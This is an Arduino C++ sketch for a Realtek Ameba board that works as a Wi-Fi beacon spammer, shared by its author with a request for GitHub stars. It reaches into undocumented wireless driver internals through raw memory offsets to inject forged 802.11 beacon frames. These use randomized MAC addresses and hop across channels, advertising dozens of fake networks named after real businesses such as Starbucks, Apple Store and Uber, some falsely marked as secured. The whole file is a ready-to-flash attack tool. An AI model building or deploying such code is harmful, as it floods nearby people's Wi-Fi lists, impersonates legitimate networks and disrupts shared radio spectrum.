//ALSO GOOD WORKS WITH ANDROID 16/IOS 18 (on ios 26 dont know)
// WARNING: version of AmebaSDK must be 3.1.7 for normal compile
//made by SoDaVk, please give me a star on github: https://github.com/SODAVK
#include <Arduino.h>
#include <WiFi.h>
#include <freertos_pmu.h>
extern "C" {
  extern uint8_t* rltk_wlan_info;
  void* alloc_mgtxmitframe(void* ptr);
  void update_mgntframe_attrib(void* ptr, void* frame_control);
  int dump_mgntframe(void* ptr, void* frame_control);
  int wext_set_channel(const char* ifname, uint8_t ch);
  int wifi_on(int mode);
  void wifi_enable_powersave(void);
  void wifi_disable_powersave(void);
}

#define POOL_SIZE 64  //num net set tut
uint8_t mac_pool[POOL_SIZE][6];
uint16_t seq_pool[POOL_SIZE];
bool beacon_active = false;
const char* const ssid_names[] = {
  "⚡Free_WiFi", "☕Starbucks", "🏠Home_Router", "📡Public_Net", "🔥Hotspot",
  "🛡️Cyber_Shield", "🚀Rocket_Net", "🛸Area_51", "🍩Dunkin_Guest", "🏢Office_Corp",
  "🏨Hotel_Guest", "🌳Park_Free", "🍔Burger_King", "🚆Railway_WiFi", "🎓Uni_Access",
  "💻Dev_Net", "🐱Cat_Cafe", "🍕Pizza_WiFi", "🔒Secure_Line", "📶Mesh_Node",
  "⚡SoDaVk_WaS_HeRe", "🎧Studio_One", "🏖️Beach_Bar", "🎮Gaming_Zone", "💡Smart_Home",
  "🛠️Service_Mode", "📦Amazon_Delivery", "🚕Uber_Driver", "🍎Apple_Store", "🏢Business_Guest"
};
const int names_count = 30;//the

void sendRawFrame(uint8_t* frame, size_t len) {
  if (!rltk_wlan_info) return;
  uint8_t* ptr = (uint8_t*)**(uint32_t**)(rltk_wlan_info + 0x10);
  void* frame_control = alloc_mgtxmitframe(ptr + 0xae0);
  if (frame_control != nullptr) {
    update_mgntframe_attrib(ptr, (uint8_t*)frame_control + 8);
    uint8_t* buffer = (uint8_t*)*(uint32_t*)((uint8_t*)frame_control + 0x80) + 0x28;
    memcpy(buffer, frame, len);
    *(uint32_t*)((uint8_t*)frame_control + 0x14) = len;
    *(uint32_t*)((uint8_t*)frame_control + 0x18) = len;
    dump_mgntframe(ptr, frame_control);
  }
}

void setup() {
  Serial.begin(115200);
  wifi_on(1);
  wifi_enable_powersave();
  pmu_set_sysactive_time(0);
  //pull
  for (int i = 0; i < POOL_SIZE; i++) {
    for (int j = 0; j < 6; j++) mac_pool[i][j] = random(256);
    mac_pool[i][0] = 0x02;
    seq_pool[i] = 0;
  }
  Serial.println(F("commands:start,stop"));
}

uint32_t fake_ts = 0;
void loop() {
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();
    if (cmd == "start") {
      beacon_active = true;
      wifi_disable_powersave();
      pmu_set_sysactive_time(0xFFFFFFFF);
      Serial.println(F("on"));
    } else if (cmd == "stop") {
      beacon_active = false;
      wifi_enable_powersave();
      pmu_set_sysactive_time(0);
      Serial.println(F("off"));
    }
  }

  if (beacon_active) {
    uint8_t channel = random(1, 14);
    wext_set_channel("wlan0", channel);
    unsigned long channel_start = millis();
    while (millis() - channel_start < 800) {
      for (int i = 0; i < POOL_SIZE; i++) {
        if (Serial.available()) return;
        /////
        uint8_t frame[256];
        int p = 0;
        /////
        frame[p++] = 0x80;
        frame[p++] = 0x00;
        frame[p++] = 0x00;
        frame[p++] = 0x00;
        memset(&frame[p], 0xff, 6);
        p += 6;  //broad
        memcpy(&frame[p], mac_pool[i], 6);
        p += 6;  //source
        memcpy(&frame[p], mac_pool[i], 6);
        p += 6;  //bssid
        //seq
        uint16_t s = (seq_pool[i] << 4);
        frame[p++] = s & 0xFF;
        frame[p++] = (s >> 8) & 0xFF;
        seq_pool[i] = (seq_pool[i] + 1) & 0x0FFF;
        //params
        fake_ts += 1024;
        memcpy(&frame[p], &fake_ts, 8);
        p += 8;
        frame[p++] = 0x64;
        frame[p++] = 0x00;//internl
        frame[p++] = (i % 2 == 0) ? 0x11 : 0x01;//privacy
        frame[p++] = 0x04;
        //
        const char* base_name = ssid_names[random(names_count)];
        String full_ssid = ((i % 2 == 0) ? "🔒 " : "📶 ") + String(base_name) + "_" + String(random(10, 99));
        frame[p++] = 0x00; //ssidtag
        frame[p++] = full_ssid.length();
        memcpy(&frame[p], full_ssid.c_str(), full_ssid.length());
        p += full_ssid.length();
        //rates
        frame[p++] = 0x01;
        frame[p++] = 0x08;
        uint8_t rates[] = { 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c };
        memcpy(&frame[p], rates, 8);
        p += 8;
        //ch
        frame[p++] = 0x03;
        frame[p++] = 0x01;
        frame[p++] = channel;
        //rsn
        if (i % 2 == 0) {
          uint8_t rsn[] = { 0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00 };
          memcpy(&frame[p], rsn, sizeof(rsn));
          p += sizeof(rsn);
        }
        //ht
        frame[p++] = 0x2d;
        frame[p++] = 0x1a;
        memset(&frame[p], 0x00, 26);
        frame[p] = 0xef;
        frame[p + 1] = 0x11;
        frame[p + 2] = 0x17;//minht
        p += 26;
        ////
        sendRawFrame(frame, p);
        delayMicroseconds(650); //delay between send packg (!smaller not better!)
      }
      delay(5);
    }
  } else {
    delay(100);
  }
}
